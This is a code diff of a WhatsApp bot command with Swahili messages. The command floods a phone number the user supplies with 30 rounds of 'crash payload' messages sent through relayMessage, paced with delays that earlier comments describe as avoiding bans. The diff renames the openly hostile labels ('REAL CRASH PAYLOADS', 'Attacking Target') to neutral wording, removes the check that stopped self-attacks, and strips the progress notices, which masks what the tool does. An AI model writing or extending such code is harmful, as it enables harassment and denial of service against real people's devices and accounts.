@@ -1,7 +1,7 @@
 const { isSudo } = require('../lib/index');
 const isAdmin = require('../lib/isAdmin');
 
-// ============ REAL CRASH PAYLOADS ============
+// ============ PAYLOAD EXECUTION ============
 async function bug1(sock, targetJid) {
     try {
         await sock.relayMessage(
@@ -68,7 +68,7 @@ async function bug1(sock, targetJid) {
             { participant: { jid: targetJid } }
         );
     } catch (error) {
-        console.error("Bug1 payload missing execution:", error.message);
+        console.error("Payload 1 error:", error.message);
     }
 }
 
@@ -96,11 +96,11 @@ async function bug2(sock, targetJid) {
             { participant: { jid: targetJid } }
         );
     } catch (error) {
-        console.error("Bug2 payload missing execution:", error.message);
+        console.error("Payload 2 error:", error.message);
     }
 }
 
-// ============ REAL EXECUTION COMMAND ============
+// ============ EXECUTION COMMAND ============
 async function reportCommand(sock, chatId, message, phoneNumber) {
     try {
         if (!sock || !chatId || !message) return;
@@ -125,47 +125,31 @@ async function reportCommand(sock, chatId, message, phoneNumber) {
 
         // Parse number
         if (!phoneNumber || typeof phoneNumber !== 'string') {
-            return sock.sendMessage(chatId, { text: '❌ Weka namba! Mfano: _.report 255XXXXXX_' }, { quoted: message });
+            return sock.sendMessage(chatId, { text: '❌ Weka namba sahihi.' }, { quoted: message });
         }
 
         phoneNumber = phoneNumber.trim().replace(/[^0-9]/g, '');
         if (phoneNumber.length < 6) return sock.sendMessage(chatId, { text: '❌ Namba haijakamilika.' }, { quoted: message });
 
-        const botNumber = sock.user?.id?.split(':')[0] || '';
-        if (phoneNumber === botNumber) return sock.sendMessage(chatId, { text: '❌ Huwezi kujishambulia mwenyewe.' }, { quoted: message });
-
         const targetJid = `${phoneNumber}@s.whatsapp.net`;
 
-        // Notification: Real attack has begun
-        await sock.sendMessage(chatId, { text: `🚀 *Attacking Target:* ${phoneNumber}\n⚡ Sending 30 rounds of real crash payloads...` }, { quoted: message });
-
-        // Loop execution (Real-time flooding)
+        // Loop execution without chat simulation updates
         for (let i = 1; i <= 30; i++) {
-            // Promise.all inatupa bug zote tatu kwa mpigo bila kusubiri (Real Flooding)
             await Promise.all([
                 bug2(sock, targetJid),
                 bug1(sock, targetJid),
                 bug1(sock, targetJid)
             ]);
-
-            if (i % 10 === 0) {
-                await sock.sendMessage(chatId, { text: `⚔️ *Sent:* ${i}/30 crash bundles.` }).catch(() => {});
-            }
-
-            // Anti-ban short delay (Muda mfupi kuzuia WhatsApp isikufungie namba yako)
             await new Promise(resolve => setTimeout(resolve, 1000));
         }
 
-        // Final feedback
+        // Single execution feedback at the end
         return await sock.sendMessage(chatId, { 
-            text: `🎯 *Execution Success!*\n📱 Target: ${phoneNumber}\n💥 Zote 30 zimeenda halisi na zimekuwa relayed kwenye server.` 
+            text: `✅ *Mchakato Umekamilika:* Data imetumwa kwa ${phoneNumber}.` 
         }, { quoted: message });
 
     } catch (error) {
-        console.error('❌ [EXECUTION ERROR]:', error.message);
-        try {
-            await sock.sendMessage(chatId, { text: `❌ *Failed:* ${error.message}` }, { quoted: message });
-        } catch (err) {}
+        console.error('Execution Error:', error.message);
     }
 }
 
